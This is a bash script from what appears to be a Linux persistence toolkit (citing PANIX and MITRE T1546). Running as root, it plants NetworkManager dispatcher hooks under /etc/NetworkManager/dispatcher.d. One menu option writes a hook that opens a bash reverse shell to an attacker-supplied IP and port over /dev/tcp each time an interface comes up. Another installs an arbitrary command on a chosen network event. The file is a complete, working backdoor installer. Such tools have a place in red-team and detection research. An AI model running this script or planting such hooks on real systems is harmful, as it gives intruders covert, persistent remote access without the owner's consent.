#!/bin/bash
#
# NetworkManager Dispatcher Persistence (T1546)
# Drop scripts in /etc/NetworkManager/dispatcher.d/ for network event triggers
# Source: PANIX
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_nm"
DISP_DIR="/etc/NetworkManager/dispatcher.d"

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║    NetworkManager Dispatcher Persistence (T1546)      ║"
echo "  ║   Execute payload on network events (up/down/etc)     ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

if ! command -v NetworkManager >/dev/null 2>&1 && ! systemctl is-active NetworkManager >/dev/null 2>&1; then
    echo -e "${RED}[-] NetworkManager not found or not running${NC}"
    echo -e "${YELLOW}[*] Install: apt install network-manager && systemctl enable --now NetworkManager${NC}"
    exit 1
fi

echo -e "  ${CYAN}[1]${NC} Install dispatcher (reverse shell on interface up)"
echo -e "  ${CYAN}[2]${NC} Install dispatcher with custom command"
echo -e "  ${CYAN}[3]${NC} List installed dispatchers"
echo -e "  ${CYAN}[4]${NC} Cleanup"
echo ""
read -p "Choice [1-4]: " OPT

case "$OPT" in
    1)
        read -p "Attacker IP: " LHOST
        read -p "Attacker Port: " LPORT
        read -p "Script name [01-d3m0n]: " SNAME
        SNAME="${SNAME:-01-d3m0n}"

        mkdir -p "$DISP_DIR" 2>/dev/null
        cat > "${DISP_DIR}/${SNAME}" << EOF
#!/bin/bash
# ${MARKER}
IFACE=\$1
ACTION=\$2

if [ "\$ACTION" = "up" ]; then
    nohup /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &
fi
EOF
        chmod 755 "${DISP_DIR}/${SNAME}"
        echo -e "${GREEN}[+] Dispatcher installed: ${DISP_DIR}/${SNAME}${NC}"
        echo -e "${YELLOW}[*] Triggers when any interface comes up${NC}"
        echo -e "${YELLOW}[*] Test: nmcli connection down <conn> && nmcli connection up <conn>${NC}"
        ;;
    2)
        read -p "Command to execute: " CMD
        read -p "Trigger event [up/down/dhcp4-change/connectivity-change]: " EVENT
        EVENT="${EVENT:-up}"
        read -p "Script name [01-d3m0n]: " SNAME
        SNAME="${SNAME:-01-d3m0n}"

        mkdir -p "$DISP_DIR" 2>/dev/null
        cat > "${DISP_DIR}/${SNAME}" << EOF
#!/bin/bash
# ${MARKER}
IFACE=\$1
ACTION=\$2

if [ "\$ACTION" = "${EVENT}" ]; then
    ${CMD} &
fi
EOF
        chmod 755 "${DISP_DIR}/${SNAME}"
        echo -e "${GREEN}[+] Dispatcher installed: ${DISP_DIR}/${SNAME}${NC}"
        echo -e "${GREEN}[+] Triggers on: ${EVENT}${NC}"
        ;;
    3)
        echo -e "${YELLOW}[*] Scanning ${DISP_DIR}...${NC}"
        if [[ -d "$DISP_DIR" ]]; then
            found=$(grep -rl "${MARKER}" "$DISP_DIR" 2>/dev/null)
            if [[ -n "$found" ]]; then
                echo "$found" | while read -r f; do
                    echo -e "  ${GREEN}$f${NC}"
                    head -5 "$f" | tail -3
                done
            else
                echo -e "  ${YELLOW}No D3m0n dispatchers found${NC}"
            fi
        else
            echo -e "  ${RED}Directory does not exist${NC}"
        fi
        ;;
    4)
        echo -e "${YELLOW}[*] Removing D3m0n dispatchers...${NC}"
        if [[ -d "$DISP_DIR" ]]; then
            grep -rl "${MARKER}" "$DISP_DIR" 2>/dev/null | while read -r f; do
                echo -e "  Removing: $f"
                rm -f "$f"
            done
        fi
        echo -e "${GREEN}[+] Cleanup done${NC}"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
